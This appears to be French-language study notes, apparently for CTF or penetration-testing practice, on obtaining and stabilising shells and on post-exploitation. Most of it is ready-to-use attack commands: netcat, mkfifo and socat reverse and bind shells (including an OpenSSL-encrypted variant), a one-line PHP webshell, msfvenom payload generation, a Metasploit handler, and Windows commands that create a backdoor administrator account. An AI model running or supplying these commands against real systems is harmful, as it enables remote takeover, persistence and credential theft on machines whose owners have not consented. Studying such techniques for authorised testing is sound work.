# 🧠SHELLS & POST‑EXPLOITATION

---



## 1️⃣ Notion fondamentale : qu’est‑ce qu’un shell ?

Un **shell** est une interface permettant d’exécuter des commandes sur un système distant.

⚠️ Un shell obtenu lors d’une attaque est **souvent instable, non‑interactif et temporaire**.

---

## 2️⃣ Types de shells

### 🔁 2.1 Reverse Shell

📌 **Principe** :

* La **cible se connecte à l’attaquant**
* L’attaquant écoute avec un *listener*

📌 **Avantages** :

* Bypass des firewalls sortants
* Très utilisé en CTF

📌 **Inconvénient** :

* Nécessite un listener configuré côté attaquant

📌 Exemple (Linux) :

**Attaquant**

```bash
nc -lvnp 443
```

**Cible**

```bash
nc <IP_ATTAQUANT> 443 -e /bin/bash
```

---

### 🔗 2.2 Bind Shell

📌 **Principe** :

* La **cible ouvre un port**
* L’attaquant s’y connecte

📌 **Avantage** :

* Pas de configuration côté attaquant

📌 **Inconvénient** :

* Souvent bloqué par firewall

📌 Exemple :

**Cible**

```bash
nc -lvnp 4444 -e /bin/bash
```

**Attaquant**

```bash
nc <IP_CIBLE> 4444
```

---

## 3️⃣ Interactivité des shells

### 🟢 Shell interactif

* Supporte :

  * `ssh`
  * `nano`, `vim`
  * confirmations (yes/no)

### 🔴 Shell non‑interactif (le plus courant)

* Pas de flèches
* Pas de Ctrl+C
* Programmes interactifs inutilisables

➡️ **Nécessite stabilisation**

---

## 4️⃣ Netcat (nc)

### 📌 4.1 Listener

```bash
nc -lvnp <PORT>
```

Options :

* `-l` : listen
* `-v` : verbose
* `-n` : no DNS
* `-p` : port

---

### 📌 4.2 Bind shell sans `-e` (Linux moderne)

```bash
mkfifo /tmp/f; nc -lvnp 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

---

### 📌 4.3 Reverse shell sans `-e`

```bash
mkfifo /tmp/f; nc <IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```

---

## 5️⃣ Stabilisation des shells Netcat

### 🐍 Technique 1 : Python (Linux)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo; fg
```

➡️ Shell quasi normal

---

### 🔄 Technique 2 : rlwrap

```bash
rlwrap nc -lvnp 443
```

Avantages :

* Flèches
* Historique
* Compatible Windows

---

### 🔌 Technique 3 : Socat

* Upload binaire statique
* Shell **beaucoup plus stable**

---

## 6️⃣ Socat

### 🔁 Reverse shell basique

**Listener**

```bash
socat TCP-L:443 -
```

**Cible Linux**

```bash
socat TCP:<IP>:443 EXEC:"bash -li"
```

---

### 🔗 Bind shell

```bash
socat TCP-L:4444 EXEC:"bash -li"
```

---

### ⭐ Shell TTY totalement stable (Linux)

**Listener**

```bash
socat TCP-L:443 FILE:`tty`,raw,echo=0
```

**Cible**

```bash
socat TCP:<IP>:443 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

---

## 7️⃣ Socat chiffré (OPENSSL)

### 📜 Génération certificat

```bash
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```

---

### 🔐 Listener chiffré

```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```

### 🔐 Reverse shell

```bash
socat OPENSSL:<IP>:443,verify=0 EXEC:/bin/bash
```

---

## 8️⃣ Webshells

### 📌 Principe

* Script exécuté par le serveur web
* Commandes passées via URL

### 📌 Exemple PHP

```php
<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>
```

Utilisation :

```
http://site/shell.php?cmd=whoami
```

---

## 9️⃣ Payloads courants

### 🐧 Linux – Netcat reverse shell

```bash
nc <IP> <PORT> -e /bin/bash
```

### 🪟 Windows – Powershell reverse shell

(Payload one‑liner long, souvent URL‑encodé)

---

## 🔟 msfvenom

### 📌 Syntaxe

```bash
msfvenom -p <PAYLOAD> LHOST=<IP> LPORT=<PORT> -f <FORMAT> -o file
```

### 📌 Exemple

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

---

### 📦 Staged vs Stageless

| Type      | Séparateur | Listener       |
| --------- | ---------- | -------------- |
| Staged    | `/`        | Metasploit     |
| Stageless | `_`        | Netcat / Socat |

---

## 1️⃣1️⃣ Metasploit multi/handler

### 📌 Utilité

* Listener avancé
* Obligatoire pour Meterpreter

### 📌 Commandes

```bash
msfconsole
use multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
exploit -j
```

---

## 1️⃣2️⃣ Après le shell : POST‑EXPLOITATION

### 🐧 Linux

🎯 Objectif : **SSH / utilisateur / root**

* Chercher clés SSH
* Credentials en clair
* Escalade privilèges

---

### 🪟 Windows

🎯 Objectif : **Administrateur / SYSTEM**

```cmd
net user hacker P@ssw0rd /add
net localgroup administrators hacker /add
```

Puis accès via RDP / WinRM

---

## 🧠 Conclusion clé

> 🔑 **Un shell n’est jamais une fin**
>
> 🎯 Toujours viser un **accès natif stable**

---

## 📌 Schéma mental final

```
Vulnérabilité
  ↓
Webshell / Reverse Shell
  ↓
Stabilisation
  ↓
Privilèges / Credentials
  ↓
SSH / RDP
  ↓
Post‑Exploitation
```

---
